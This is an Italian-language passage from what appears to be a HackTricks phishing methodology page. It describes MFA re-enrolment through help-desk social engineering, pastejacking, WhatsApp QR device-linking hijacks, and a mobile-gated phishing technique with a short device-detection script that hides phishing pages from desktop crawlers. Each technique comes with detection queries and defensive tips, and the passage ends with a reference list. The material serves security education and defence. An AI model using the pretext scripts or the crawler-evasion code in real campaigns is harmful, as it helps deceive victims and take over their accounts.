Oltre al classico push-bombing, gli operatori semplicemente **forzano una nuova registrazione MFA** durante la chiamata all'help desk, invalidando il token esistente dell'utente. Qualsiasi prompt di accesso successivo appare legittimo alla vittima.
```text
[Attacker]  →  Help-Desk:  “I lost my phone while travelling, can you unenrol it so I can add a new authenticator?”
[Help-Desk] →  AzureAD: ‘Delete existing methods’ → sends registration e-mail
[Attacker]  →  Completes new TOTP enrolment on their own device
```
Monitora gli eventi AzureAD/AWS/Okta in cui **`deleteMFA` + `addMFA`** si verificano **entro pochi minuti dallo stesso IP**.



## Clipboard Hijacking / Pastejacking

Gli attaccanti possono copiare silenziosamente comandi dannosi negli appunti della vittima da una pagina web compromessa o typosquatted, quindi indurre l'utente a incollarli all'interno di **Win + R**, **Win + X** o di una finestra del terminale, eseguendo codice arbitrario senza alcun download o allegato.


{{#ref}}
clipboard-hijacking.md
{{#endref}}

## Mobile Phishing & Malicious App Distribution (Android & iOS)


{{#ref}}
mobile-phishing-malicious-apps.md
{{#endref}}

### WhatsApp device-linking hijack via QR social engineering
* Una lure page (ad esempio un falso “canale” di ministero/CERT) mostra un codice QR di WhatsApp Web/Desktop e istruisce la vittima a scansionarlo, aggiungendo silenziosamente l'attaccante come **linked device**.<sup>[[12]](#references)</sup>
* L'attaccante ottiene immediatamente visibilità su chat e contatti finché la sessione non viene rimossa. In seguito, le vittime potrebbero visualizzare una notifica “nuovo dispositivo collegato”; i difensori possono cercare eventi di collegamento di dispositivi imprevisti poco dopo le visite a pagine QR non attendibili.

### Mobile‑gated phishing to evade crawlers/sandboxes
Gli operatori applicano sempre più spesso un gate ai propri flussi di phishing tramite un semplice controllo del dispositivo, in modo che i crawler desktop non raggiungano mai le pagine finali. Un pattern comune consiste in un piccolo script che verifica la presenza di un DOM in grado di supportare il touch e invia il risultato a un server endpoint; i client non mobile ricevono HTTP 500 (o una pagina vuota), mentre agli utenti mobile viene servito il flusso completo.<sup>[[7]](#references)</sup>

Snippet client minimo (logica tipica):
```html
<script src="/static/detect_device.js"></script>
```
Logica di `detect_device.js` (semplificata):
```javascript
const isMobile = ('ontouchstart' in document.documentElement);
fetch('/detect', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({is_mobile:isMobile})})
.then(()=>location.reload());
```
Comportamento del server osservato frequentemente:
- Imposta un cookie di sessione durante il primo caricamento.
- Accetta `POST /detect {"is_mobile":true|false}`.
- Restituisce 500 (o un segnaposto) alle GET successive quando `is_mobile=false`; serve contenuti di phishing solo se `true`.

Euristiche per la ricerca e il rilevamento:
- Query urlscan: `filename:"detect_device.js" AND page.status:500`
- Telemetria web: sequenza `GET /static/detect_device.js` → `POST /detect` → HTTP 500 per i dispositivi non mobile; i percorsi legittimi delle vittime mobile restituiscono 200 con HTML/JS successivi.
- Bloccare o esaminare attentamente le pagine che condizionano il contenuto esclusivamente su `ontouchstart` o controlli simili del dispositivo.

Suggerimenti per la difesa:
- Eseguire i crawler con fingerprint simili a quelli mobile e JS abilitato per rivelare i contenuti gated.
- Generare alert per risposte 500 sospette successive a `POST /detect` su domini registrati di recente.

## References

- [1] [Generazione di variazioni dei domini utilizzate nel phishing (Zeltser)](https://zeltser.com/domain-name-variations-in-phishing/)
- [2] [Individuare il phishing: strumenti e tecniche (0xPatrik)](https://0xpatrik.com/phishing-domains/)
- [3] [Rubare credenziali e bypassare la 2FA usando noVNC (mr.d0x)](https://mrd0x.com/bypass-2fa-using-novnc/)
- [4] [Rubare sessioni e bypassare la 2FA con EvilnoVNC (darkbyte.net)](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
- [5] [Come installare e configurare DKIM con Postfix su Debian Wheezy (DigitalOcean)](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)
- [6] [Report globale sulla risposta agli incidenti di Unit 42 2025 - Edizione Social Engineering](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
- [7] [Silent Smishing - infrastrutture di phishing con accesso vincolato al mobile ed euristiche (Sekoia.io)](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
- [8] [La prossima frontiera degli attacchi di Runtime Assembly: utilizzo degli LLM per generare JavaScript di phishing in tempo reale](https://unit42.paloaltonetworks.com/real-time-malicious-javascript-through-llms/)
- [9] [Impersonation, Click Hijacking e TDS: all'interno di un ecosistema di distribuzione di malware](https://research.checkpoint.com/2026/impersonation-click-hijacking-and-tds-inside-a-malware-distribution-ecosystem/)
- [10] [Bitsquatting di Windows.com (Remy Hax)](https://remyhax.xyz/posts/bitsquatting-windows/)
- [11] [Dirottamento del traffico verso windows.com di Microsoft tramite bit flipping (BleepingComputer)](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)
- [12] [Love? Actually: una falsa app di incontri usata come esca in una campagna di spyware mirata in Pakistan](https://www.welivesecurity.com/en/eset-research/love-actually-fake-dating-app-used-lure-targeted-spyware-campaign-pakistan/)
- [13] [IoC e campioni di ESET GhostChat](https://github.com/eset/malware-ioc/tree/master/ghostchat)
{{#include ../../banners/hacktricks-training.md}}
